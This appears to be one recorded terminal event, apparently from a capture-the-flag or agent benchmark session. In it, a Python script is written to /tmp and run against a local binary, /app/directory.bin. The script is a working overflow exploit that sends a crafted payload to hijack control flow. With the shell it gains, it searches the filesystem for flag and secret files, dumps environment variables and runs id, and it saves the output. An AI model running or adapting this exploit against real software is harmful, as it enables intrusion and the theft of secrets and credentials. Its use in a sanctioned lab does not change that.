[3312.34997, "i", "cat << 'EOF' > /tmp/pexp.py\nimport os, time, sys, fcntl\n\npid, fd = os.forkpty()\nif pid == 0:\n    os.execv('/app/directory.bin', ['/app/directory.bin'])\nelse:\n    fl = fcntl.fcntl(fd, fcntl.F_GETFL)\n    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)\n\n    def read_out(timeout=1):\n        start = time.time()\n        out = b''\n        while time.time() - start < timeout:\n            try:\n                chunk = os.read(fd, 4096)\n                out += chunk\n            except BlockingIOError:\n                time.sleep(0.01)\n            except Exception:\n                break\n        return out\n\n    time.sleep(0.2)\n    for i in range(9):\n        os.write(fd, b\"1\\n\")\n        time.sleep(0.05)\n        os.write(fd, b\"A\\n\")\n        time.sleep(0.05)\n        \n    os.write(fd, b\"1\\n\")\n    time.sleep(0.05)\n    os.write(fd, b\"A\"*32 + b\"B\"*8 + b\"\\x37\")\n    time.sleep(0.05)\n    \n    os.write(fd, b\"4\\n\")\n    time.sleep(0.5)\n\n    read_out(0.2)\n\n    cmd = b\"echo EXPLOIT_SUCCESS; find / -name '*flag*' -o -name '*secret*' 2>/dev/null; env; id; echo EXPLOIT_END; exit\\n\"\n    os.write(fd, cmd)\n    \n    final_out = read_out(3)\n    open('/tmp/exploit_out.txt', 'wb').write(final_out)\nEOF\npython3 /tmp/pexp.py\n"]
